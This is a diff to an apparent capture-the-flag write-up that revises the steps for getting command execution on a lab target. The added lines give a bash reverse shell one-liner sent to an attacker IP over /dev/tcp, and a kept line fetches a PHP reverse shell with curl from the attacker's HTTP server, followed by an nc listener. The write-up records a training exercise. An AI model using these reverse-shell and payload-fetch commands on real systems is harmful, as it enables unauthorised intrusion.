@@ -101,18 +101,22 @@ def run_cmd(cmd):
         html = req.text
         return re.search(r'\#L\#(.*)\#R\#', html, re.DOTALL).group(1)
 
-print(run_cmd('whoami'))
+print(run_cmd('id'))
 ```
 
-**Note** that we cannot directly invoke a bash reverse shell (the connection is immediately closed).
+6. From there, it is possible to immediately invoke a reverse shell (nested in another shell call):
 
-6. Prepare a PHP reverse shell `shell.php` (port 4444 here). Start a HTTP server `python3 -m http.server` (port 8000 here) in the same directory. Upload the reverse shell.
+```python3
+run_cmd("bash -c 'bash -i >& /dev/tcp/10.9.***.***/4444 0>&1'")
+```
+
+**Or alternatively** to locally prepare a PHP reverse shell `shell.php` (port 4444 here). Start a HTTP server `python3 -m http.server` (port 8000 here) in the same directory. Upload the reverse shell.
 
 ```python3
 run_cmd('curl http://10.9.***.***:8000/shell.php > shell.php')
 ```
 
-Get in and grab the **flags 1 & 2** (easy to find).
+Whatever the approach, get in and grab the **flags 1 & 2** (easy to find).
 
 ```
 $ nc -lnvp 4444    
